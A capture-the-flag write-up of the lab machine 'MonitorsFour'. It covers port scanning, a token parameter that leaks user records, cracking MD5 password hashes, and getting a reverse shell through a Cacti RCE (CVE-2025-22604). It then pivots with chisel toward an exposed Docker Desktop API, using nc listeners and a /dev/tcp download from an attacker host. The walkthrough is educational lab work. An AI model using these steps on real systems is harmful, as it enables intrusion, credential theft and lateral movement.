---
layout: writeup
title: "MonitorsFour"
difficulty: Easy
os: Windows
---

OS: Windows

# Enumeration

We look at the open ports:

```bash
sudo nmap 10.129.4.135 -p- --min-rate 5000 -sS -Pn -n -oN ports
```

```console
Nmap scan report for 10.129.4.135
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Now we run a detailed scan against each port we found:

```bash
sudo nmap 10.129.4.135 -p80,5985 -sCV -T5 -vvv -oN Exact_scan
```

```console
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see there's a website, let's take a look:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524231904.png)

The only button that does anything is Login, but I didn't find any vulnerability (like SQLi, XXE, or others):

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524232011.png)

Since we didn't find anything too interesting on the page, we can try fuzzing:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524232418.png)

We see a section with a different Size from all the others, so we can take a look:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524232532.png)

The page tells us "Missing token parameter". This could refer to a CSRF token or, more interestingly, a parameter literally named token. Let's try adding it to the URL:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524232811.png)

Now it says "invalid token". We need to find what a valid token might be. Let's try a number, for example 0:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524232925.png)

We have information. Let's tidy it up a bit. Since it was in a "list of dictionaries" format, it was perfect to process with Python, so I wrote this simple script:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524234017.png)

Getting the following:

```console
########################################
id: 2
username: admin
email: admin@monitorsfour.htb
password: 56b32eb43e6f15395f6c46c1c9e1cd36
role: super user
token: 8024b78f83f102da4f
name: Marcus Higgins
position: System Administrator
########################################
id: 5
username: mwatson
email: mwatson@monitorsfour.htb
password: 69196959c16b26ef00b77d82cf6eb169
role: user
name: Michael Watson
position: Website Administrator
########################################
```

The passwords look hashed as something like MD4 or MD5. Let's try cracking them with john, but first we put only the hashes in a file, which we can do with some bash commands:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524234515.png)

Now we crack these hashes. I first tried MD4; when that didn't work I tried MD5, which gave the password ***wonderful1*** for the hash `56b32eb43e6f15395f6c46c1c9e1cd36`:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524234452.png)

This password belongs to the user `admin`. We try the credentials on the login page:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524235215.png)

We reach what looks like an admin panel:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524235252.png)

Reviewing this entry panel we don't find much, so we can search for subdomains:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260524235823.png)

We add it to our `/etc/hosts` and check the page:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260525000340.png)

I tried using the monitorsfour credentials but they don't seem to be allowed. However, there's something else we can try: I saw a clear pattern in how the usernames were built, matching the employees' full names, e.g. (Username: mwatson, Name: Michael Watson).

The administrator is named Marcus Higgins, so we can try marcus, higgins, or mhiggins. Luckily, marcus worked:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260525000646.png)

This version of Cacti is 1.2.28, which after some research is vulnerable to [CVE-2025-22604](https://www.cve.news/cve-2025-22604/), an RCE!! Interesting...

First we set up a listener:

```bash
sudo nc -lvnp 4444
```

Now we run the exploit that gives us the reverse shell:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260525005840.png)

Inside the machine we notice 2 interesting things. First, thanks to the hostname (821fbd6a43fa) we realize we're probably inside a docker container, which we can confirm by the existence of the `/.dockerenv` file.

Also, in the `/home` directory we find the home directory of the user marcus, which we have read access to. Let's go in and see what it contains:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260525010456.png)

Considering we're in a container that is itself running on WSL2 (because this is a Windows machine), it's most likely Docker Desktop is being deployed behind the scenes. A quick search found the following:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260525234134.png)

There seems to be a vulnerability catalogued as [CVE-2025-9074](https://socprime.com/blog/cve-2025-9074-docker-desktop-vulnerability/), which basically consists of the Docker API being exposed to the container through the default internal subnet (192.168.65.7:2375). Let's see if we can interact with this API to confirm the vulnerability, using curl:

```bash
curl http://192.168.65.7:2375/version
```

![](/Hacked-Machines/assets/images/Pasted%20image%2020260526000656.png)

Interacting with the Docker API is basically full control over creating, deleting and managing containers, essentially everything you can do with the docker command (Docker CLI), because the docker command and Docker Desktop itself do nothing more than interact with this REST API. There are two options here:

1. Pivot our connections and use the docker command on our attacker machine so it interacts with this exposed API.
2. Make the requests directly with curl.

# Pivoting with Chisel

#### Transfer chisel

On the attacker machine:

```bash
nc -lvnp 8888 < chisel
```

On the victim machine:

```bash
cat < /dev/tcp/{ATTACKER_IP}/{PORT} > chisel
```

# Establish the tunnel

On the attacker machine:

```bash
sudo chisel server --reverse -p 9090
```

**IMPORTANT**: add this line at the end of `/etc/proxychains4.conf`:

```text
socks5   127.0.0.1   1080
```

On the victim machine:

```bash
./chisel client {ATTACKER_IP}:9090
```

The result should look like this:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260526003359.png)

![](/Hacked-Machines/assets/images/Pasted%20image%2020260526003326.png)

Now we can use proxychains. Let's verify everything is working correctly:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260526003610.png)

As we can see, the tunnel is working perfectly. Let's try using the docker command to interact with this API and run commands on the host system.
